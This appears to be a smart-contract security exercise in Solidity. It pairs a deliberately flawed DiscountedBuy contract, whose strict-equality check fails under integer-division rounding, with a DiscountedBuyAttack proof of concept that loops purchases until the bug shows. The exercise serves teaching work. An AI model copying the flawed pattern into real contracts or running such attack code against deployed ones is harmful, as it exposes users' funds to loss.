//*** Exercice 7 ***//
// You can buy some object.
// Further purchases are discounted.
// You need to pay basePrice / (1 + objectBought), where objectBought is the number of object you previously bought.
contract DiscountedBuy {
    uint public basePrice = 1 ether;
    mapping (address => uint) public objectBought;

    /// @dev Buy an object.
    function buy() payable {
        require(msg.value * (1 + objectBought[msg.sender]) == basePrice);
        objectBought[msg.sender]+=1;
    }

    /** @dev Return the price you'll need to pay.
     *  @return price The amount you need to pay in wei.
     */
    function price() constant returns(uint price) {
        return basePrice/(1 + objectBought[msg.sender]);
    }

}


contract DiscountedBuyAttack {
  DiscountedBuy victim;

  constructor(address _victim) public payable {
      victim = DiscountedBuy(_victim);
  }

  //victim contract has a bug that only allows buying two items per account
  //because of uint arithmentics price is set at 333333333333333333, which we can't
  //get to because (333333333333333333 wei * (1 + 2)) returning 999999999999999999.
  //thus failing the strict equal requirement in the buy function.
  function attack() external payable returns(bool success, uint8 count) {
      require(msg.value >= 2 ether);
      uint basePrice = 1 ether;
        while (this.balance > 1 wei) {
            victim.buy.value(basePrice / (1 + count))(); //breaks at count = 2
            count++;
        }
        return (true, count);
  }
}
